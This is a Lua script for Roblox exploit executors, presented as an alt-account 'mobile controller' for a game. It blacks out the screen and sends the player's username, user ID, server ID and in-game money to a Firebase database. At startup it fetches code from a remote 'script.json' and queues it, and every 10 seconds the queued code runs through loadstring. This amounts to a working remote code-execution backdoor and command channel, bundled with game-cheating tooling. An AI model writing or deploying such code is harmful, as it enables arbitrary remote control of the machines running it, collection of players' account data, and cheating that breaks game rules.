-- Carter's DHC Mobile Script (Executor-Ready: Delta, Synapse, Fluxus)
-- Fixed & Debug-Enhanced Version

-- Function to make screen black
local function makeScreenBlack()
    if game:GetService("CoreGui") then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BlackScreenGui"
        screenGui.IgnoreGuiInset = true
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui

        screenGui.Parent = game:GetService("CoreGui")
    end
end

-- Command workspace
local commandWorkspace = {}

-- Alt config
local altConfig = {
    avoidDuplicates = true,
    deathProtection = true,
    deathCount = 0,
    deathTimer = 0,
    knownUsers = {}
}

-- Analytics
local analytics = {
    money = 0,
    wantedLevel = 0,
    startMoney = 0,
    moneyGained = 0,
    lastUpdate = 0
}

-- ✅ Universal request wrapper (executor only)
local function makeRequest(options)
    local requestFunc = syn and syn.request
        or http and http.request
        or http_request
        or request
        or fluxus and fluxus.request

    if requestFunc then
        local ok, result = pcall(function()
            return requestFunc(options)
        end)
        if not ok then
            warn("[makeRequest] Request failed: " .. tostring(result))
            return nil
        end
        return result
    else
        warn("[makeRequest] No supported HTTP request function found in this executor.")
        return nil
    end
end

-- Get player info
local function getPlayerInfo()
    local player = game.Players.LocalPlayer
    if player then
        return {
            username = player.Name,
            userid = player.UserId,
            serverid = game.JobId,
            placeid = game.PlaceId,
            status = "connected"
        }
    end
    return nil
end

-- Update analytics
local function updateAnalyticsData()
    local player = game.Players.LocalPlayer
    if not player then return end

    local currentMoney, currentWanted = 0, 0

    pcall(function()
        if player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Currency") then
            currentMoney = player.DataFolder.Currency.Value
        end
    end)

    pcall(function()
        if player:FindFirstChild("DataFolder")
            and player.DataFolder:FindFirstChild("Information")
            and player.DataFolder.Information:FindFirstChild("Wanted") then
            currentWanted = player.DataFolder.Information.Wanted.Value
        end
    end)

    if analytics.startMoney == 0 then
        analytics.startMoney = currentMoney
        analytics.money = currentMoney
    end

    analytics.moneyGained = currentMoney - analytics.startMoney
    analytics.money = currentMoney
    analytics.wantedLevel = currentWanted

    if tick() - analytics.lastUpdate > 30 then
        analytics.lastUpdate = tick()

        local playerInfo = getPlayerInfo()
        if playerInfo then
            print("[Analytics] Sending data for " .. playerInfo.username .. " (UserId: " .. playerInfo.userid .. ")")

            local result = makeRequest({
                Url = "https://omebgle-default-rtdb.firebaseio.com/analytics/" .. playerInfo.userid .. ".json",
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = game:GetService("HttpService"):JSONEncode({
                    username = playerInfo.username,
                    money = analytics.money,
                    wantedLevel = analytics.wantedLevel,
                    moneyGained = analytics.moneyGained,
                    lastUpdate = os.time(),
                    serverId = game.JobId
                })
            })

            if not result then
                warn("[Analytics] Failed to send analytics data.")
            else
                print("[Analytics] Data sent successfully!")
            end
        end
    end
end

-- Check and execute Firebase script
local function checkAndExecuteScript()
    local url = "https://omebgle-default-rtdb.firebaseio.com/script.json"

    local success, response = pcall(function()
        local result = makeRequest({ Url = url, Method = "GET" })
        return result and result.Body
    end)

    if success and response then
        local data = game:GetService("HttpService"):JSONDecode(response)
        if data and data.code and data.code ~= "" then
            table.insert(commandWorkspace, data.code)

            makeRequest({
                Url = url,
                Method = "PUT",
                Headers = { ["Content-Type"] = "application/json" },
                Body = '{"code":""}'
            })
        end
    end
end

-- Process workspace commands
local function processCommandWorkspace()
    while #commandWorkspace > 0 do
        local command = table.remove(commandWorkspace, 1)
        local ok, err = pcall(function()
            loadstring(command)()
        end)
        if not ok then
            warn("[Command] Execution error: " .. tostring(err))
        end
    end
end

-- Send player info
local function sendPlayerInfo()
    local playerInfo = getPlayerInfo()
    if playerInfo then
        makeRequest({
            Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
            Method = "PUT",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode(playerInfo)
        })
        print("[PlayerInfo] Sent successfully for " .. playerInfo.username)
    end
end

-- Send heartbeat
local function sendHeartbeat()
    local playerInfo = getPlayerInfo()
    if playerInfo then
        makeRequest({
            Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
            Method = "PUT",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode({
                timestamp = os.time(),
                userid = playerInfo.userid
            })
        })
        print("[Heartbeat] Sent at " .. os.time())
    end
end

-- Server hop
local function serverHop()
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local placeId = game.PlaceId
    local serversUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"

    local success, response = pcall(function()
        local result = makeRequest({ Url = serversUrl, Method = "GET" })
        return result and result.Body
    end)

    if success and response then
        local data = HttpService:JSONDecode(response)
        if data and data.data then
            local servers = {}
            for _, server in ipairs(data.data) do
                if server.id ~= game.JobId and server.playing < server.maxPlayers then
                    table.insert(servers, server)
                end
            end
            if #servers > 0 then
                local randomServer = servers[math.random(1, #servers)]
                TeleportService:TeleportToPlaceInstance(placeId, randomServer.id)
            else
                warn("[ServerHop] No available servers")
            end
        end
    else
        warn("[ServerHop] Failed to fetch servers")
    end
end

-- Death protection
local function setupDeathProtection()
    if not altConfig.deathProtection then return end

    local player = game.Players.LocalPlayer
    player.CharacterAdded:Connect(function(character)
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            local now = tick()
            if now - altConfig.deathTimer > 120 then
                altConfig.deathCount = 0
                altConfig.deathTimer = now
            end
            altConfig.deathCount += 1
            if altConfig.deathCount >= 6 then
                warn("[DeathProtection] Too many deaths, hopping...")
                serverHop()
            end
        end)
    end)
end

-- ✅ Setup
makeScreenBlack()
sendPlayerInfo()
setupDeathProtection()
checkAndExecuteScript()

local playerInfo = getPlayerInfo()
if playerInfo then
    spawn(function()
        while true do
            wait(10)
            sendHeartbeat()
            sendPlayerInfo()
            updateAnalyticsData()
            processCommandWorkspace()
        end
    end)
end

print("Carter's DHC Mobile Controller loaded successfully!")
print("Script executed once successfully!")
